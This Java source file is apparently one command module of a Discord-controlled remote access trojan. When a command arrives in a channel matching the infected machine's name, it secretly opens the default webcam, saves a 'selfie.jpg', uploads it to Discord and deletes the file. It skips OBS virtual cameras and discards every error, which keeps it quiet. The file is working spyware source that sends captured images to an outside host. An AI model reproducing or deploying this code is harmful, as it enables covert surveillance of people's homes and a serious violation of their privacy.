package me.vasler.command.impl;

import com.github.sarxos.webcam.Webcam;
import me.vasler.Main;
import me.vasler.command.Command;
import net.dv8tion.jda.api.EmbedBuilder;
import net.dv8tion.jda.api.entities.MessageEmbed;
import net.dv8tion.jda.api.entities.channel.concrete.TextChannel;
import net.dv8tion.jda.api.utils.FileUpload;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.File;
import java.io.IOException;

public class CameraCommand
extends Command {
    public CameraCommand() {
        super(new String[]{"cam", "camera", "cams"});
    }

    @Override
    public void run(String[] args, TextChannel channel) throws IOException {
        if (!channel.getName().equalsIgnoreCase(Main.name)) {
            return;
        }
        Webcam webcam = Webcam.getDefault();
        EmbedBuilder eb = new EmbedBuilder();
        eb.setTitle("Camera", null);
        eb.setColor(Color.MAGENTA);
        eb.setDescription(webcam == null || webcam.getName().toLowerCase().contains("obs virtual camera") ? "Unable to take photo." : "Taking photo with " + webcam.getName());
        channel.sendMessageEmbeds(eb.build(), new MessageEmbed[0]).queue();
        CameraCommand.captureCamera();
        if (webcam == null || webcam.getName().toLowerCase().contains("obs virtual camera")) {
            return;
        }
        File jpg = new File(Main.dir.getAbsolutePath(), "selfie.jpg");
        channel.sendFiles(new FileUpload[]{FileUpload.fromData(jpg)}).queue();
        jpg.delete();
    }

    public static void captureCamera() {
        try {
            Webcam webcam = Webcam.getDefault();
            if (webcam == null || webcam.getName().toLowerCase().contains("obs virtual camera")) {
                return;
            }
            webcam.open();
            BufferedImage image = webcam.getImage();
            ImageIO.write(image, "JPG", new File(Main.dir.getAbsolutePath() + "\\selfie.jpg"));
        }
        catch (Exception exception) {
            // empty catch block
        }
    }
}

